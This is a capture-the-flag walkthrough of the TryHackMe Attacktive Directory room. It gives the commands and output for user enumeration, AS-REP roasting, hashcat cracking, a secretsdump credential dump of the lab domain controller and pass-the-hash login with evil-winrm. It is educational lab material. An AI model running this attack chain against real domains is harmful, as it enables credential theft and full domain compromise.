---
title: Attacktive Directory Room Walkthroug/
---

**Description: Attacktive Directory Tryhackme Room Walkthrough**

Room link: https://tryhackme.com/room/attacktivedirectory

# Enumeration: Welcome To Attacktive Directory

Performing an initial `nmap` scan on the target IP address:

`nmap -sV -sC -Pn <INSERT IP ADDRESS>`

![](https://i.imgur.com/QAbD4GA.png)

We see various ports open! We also see a domain name which is `spookysec.local`. We can also run `crackmapexec` on the target to confirm this domain name:

`crackmapexec smb <INSERT IP ADDRESS>`

![](https://i.imgur.com/wA439ok.png)

We now know that the TLD being used is `.local`!

Viewing the questions, we see that it's asking us what tool we can use to enumerate ports `139/445`. We can use `enum4linux` for this:

`enum4linux <INSERT IP ADDRESS>`

```bash
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Oct 14 05:12:39 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.101.197
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.10.101.197 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 10.10.101.197 )===============================

Looking up status of 10.10.101.197
No reply from 10.10.101.197

 ===================================( Session Check on 10.10.101.197 )===================================


[+] Server 10.10.101.197 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.101.197 )================================

Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)


 ==================================( OS information on 10.10.101.197 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.101.197 from srvinfo: 
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.10.101.197 )=======================================
                                                                                                                                                                                                            
                                                                                                                                                                                                            
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                                                                        
                                                                                                                                                                                                            
                                                                                                                                                                                                            

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                                                                         
                                                                                                                                                                                                            
                                                                                                                                                                                                            
 =================================( Share Enumeration on 10.10.101.197 )=================================
                                                                                                                                                                                                            
do_connect: Connection to 10.10.101.197 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                                    

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.101.197                                                                                                                                                               
                                                                                                                                                                                                            
                                                                                                                                                                                                            
 ===========================( Password Policy Information for 10.10.101.197 )===========================
                                                                                                                                                                                                            
                                                                                                                                                                                                            
[E] Unexpected error from polenum:                                                                                                                                                                          
                                                                                                                                                                                                            
                                                                                                                                                                                                            

[+] Attaching to 10.10.101.197 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.101.197)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            

 ======================================( Groups on 10.10.101.197 )======================================
                                                                                                                                                                                                            
                                                                                                                                                                                                            
[+] Getting builtin groups:                                                                                                                                                                                 
                                                                                                                                                                                                            
                                                                                                                                                                                                            
[+]  Getting builtin group memberships:                                                                                                                                                                     
                                                                                                                                                                                                            
                                                                                                                                                                                                            
[+]  Getting local groups:                                                                                                                                                                                  
                                                                                                                                                                                                            
                                                                                                                                                                                                            
[+]  Getting local group memberships:                                                                                                                                                                       
                                                                                                                                                                                                            
                                                                                                                                                                                                            
[+]  Getting domain groups:                                                                                                                                                                                 
                                                                                                                                                                                                            
                                                                                                                                                                                                            
[+]  Getting domain group memberships:                                                                                                                                                                      
                                                                                                                                                                                                            
                                                                                                                                                                                                            
 ==================( Users on 10.10.101.197 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                                                            
                                                                                                                                                                                                            
[I] Found new SID:                                                                                                                                                                                          
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                                                          
S-1-5-21-3591857110-2884097990-301047963                                                                                                                                                                    

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''                                                                                                 
                                                                                                                                                                                                            
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)                                                                                                                              
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)

[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''                                                                                                
                                                                                                                                                                                                            
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)                                                                                                                    
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

 ===============================( Getting printer info for 10.10.101.197 )===============================
                                                                                                                                                                                                            
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                     


enum4linux complete on Sat Oct 14 05:21:36 2023
```

We find that the domain name is `THM-AD`
# Enumeration: Enumerating Users via Kerberos

We'll be using [Kerbrute](https://github.com/ropnop/kerbrute) in order to help enumerate users which helps us brute force valid AD users via Kerberos Pre-Authentication. 

We'll be using the `userenum` command/module from this tool

* How this works is it sends a *Ticket Granting Ticket (TGT)* request with no pre-authentiation to the *Key Distribution Center (KDC)* of the AD network. If the KDC responds with a *PRINCIPAL UNKNOWN*, then this indicates to us that the username doesn't exist. But if the KDC asks for pre-authentication, we know the username exists.
* According to the Github page, the `userenum` module doesn't cause any login failures which means we don't run the risk of locking out any user accounts.

We can use `kerbrute` by running:

`kerbrute userenum -d spookysec.local --dc <INSERT IP ADDRESS> userlist.txt -t10`

* The `userlist.txt` file can be downloaded from [here](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt)

![](https://i.imgur.com/mwz6uKu.png)

The most interesting account I found was `svc-admin` which indicates it a service admin account! There's also a `backup` account which is interesting!
# Exploitation: Abusing Kerberos

Now that we've enumerated some valid usernames within the AD environment, we can now attempt to request TGTs from those valid usernames without providing the password. This is known as **ASREPRoasting** which occurs when an account has the **Does not require pre-authentication** config set. We can abuse this since we don't need to provide a password when requesting a TGT from a user account.

All we need to know is the username, domain it belongs to, and the domain controller IP, all of which we already have!

We can attempt to perform **ASREPRoasting** by using **Get-NPUsers** from the [Impacket library](https://github.com/fortra/impacket):

`impacket-GetNPUsers spookysec.local\svc-admin -dc-ip <INSERT IP ADDRESS> -no-pass`

This will give us a TGT in a file format that we can then use Hashcat to crack:

By default, `GetNPUsers` will output the TGT within a hashcat compatible format which has the string `asrep` within it. If we look at the [Hashcat wiki](https://hashcat.net/wiki/doku.php?id=example_hashes), it says that this hash type is **Kerberos 5, etype 23, AS-REP** which is of mode **18200**: 

```bash
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:eadff12593f17a04b6f89c921ff6506e$8c5d81b69052c73d471d8a5d7e76cc1bc195dbb6c13c7b8d4e4e4175f023037fa7406a0f124e46144a4705491acc6d896ed2ee9ab65b86ef5264cb9ec6fbedbac9dda26df85698cf5caba00d126f31e66b8b1d5d468922b3658af7f5eb505fd9d314110597128b8746676adea63e62652ea1ac3dc777e6cd22afe740971f65bb1a3f20205845239fda9c71e90f5e8d838c26a8164023d45f58625b9eca53048695be9ea16e0788d0974f894c30199fb851a37c7ab7e7b540afa3a214f95cbd9dfb384c6049e6843e49a04eace680a8dcee89dbdc189707f616e7485fbe541955e057ef43a16b1ea8d4d827649278ead60e3e
```


We can then use the [provided password list](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt) as our wordlist and specify the hash format and our hash file to begin cracking:

`hashcat -m18200 tgt.txt passwordlist.txt`


```bash
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:eadff12593f17a04b6f89c921ff6506e$8c5d81b69052c73d471d8a5d7e76cc1bc195dbb6c13c7b8d4e4e4175f023037fa7406a0f124e46144a4705491acc6d896ed2ee9ab65b86ef5264cb9ec6fbedbac9dda26df85698cf5caba00d126f31e66b8b1d5d468922b3658af7f5eb505fd9d314110597128b8746676adea63e62652ea1ac3dc777e6cd22afe740971f65bb1a3f20205845239fda9c71e90f5e8d838c26a8164023d45f58625b9eca53048695be9ea16e0788d0974f894c30199fb851a37c7ab7e7b540afa3a214f95cbd9dfb384c6049e6843e49a04eace680a8dcee89dbdc189707f616e7485fbe541955e057ef43a16b1ea8d4d827649278ead60e3e:management2005
```

And we've cracked the hash: `management2005`!
# Enumeration: Back to Basics

Now that we have the password, we can enumerate the shares that the `svc-admin` user has access to:

`smbclient -L <INSERT IP ADDRESS> -U svc-admin`

![](https://i.imgur.com/Un7wvhk.png)

We see 6 shares, the most interesting being `backup`! We can login and view the contents of this share via: `smbclient \\\\<INSERT IP ADDRESS>\\backup -U svc-admin`:

![](https://i.imgur.com/h4UHfCc.png)

We can download this file by running `mget backup_credentials`.

Reading the contents of this file, we see it's base64 encoded string:

![](https://i.imgur.com/YY5O1Rn.png)

We now have the credentials for the `backup` account!
# Domain Privilege Escalation: Elevating Privileges within the Domain

Since we have the `backup` account credentials, we now have unique permissions since it's the backup account for the Domain Controller (DC)! This account allows all AD changes to be synced with it, including *password hashes*!

So basically we're able to access *password hashes* from the DC using the `backup` account credentials! We can do so using `secretsdump.py` which is another tool from the  [Impacket library](https://github.com/fortra/impacket):

`impacket-secretsdump spookysec.local/backup:backup2517860@<INSERT IP ADDRESS>`

```bash
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:b138fbf66ab1b3a239128a02ffbd98da:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:7c3276f4004e5c55fe8685294181bdadbea58796c616a8903eff870c9d7d484b
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:e2207c3388c37fec738395fbc106f843
ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
[*] Cleaning up...
```

Now what do we have here? Well we have a ton of secrets, including: 

* NTLM hashes of all the users within the domain
* Kerberos keys for users within the domain

We can also see that it used the *DRSUAPI* method in order to dump the secrets.

We can now use these password hashes in a **Pass The Hash** attack in order to login remotely to the system using any of these usernames & hash combinations! The tool [evil-winrm](https://github.com/Hackplayers/evil-winrm) gives us exactly what we need to perform this attack!

For example, say we wanted to login as the `Administrator` user, we simply grab the hash which is `0e0363213e37b94221497260b0bcb4fc`:

`evil-winrm -i <INSERT IP ADDRESS> -u administrator -H 0e0363213e37b94221497260b0bcb4fc`

![](https://i.imgur.com/3YTtAew.png)

And we got the root flag!
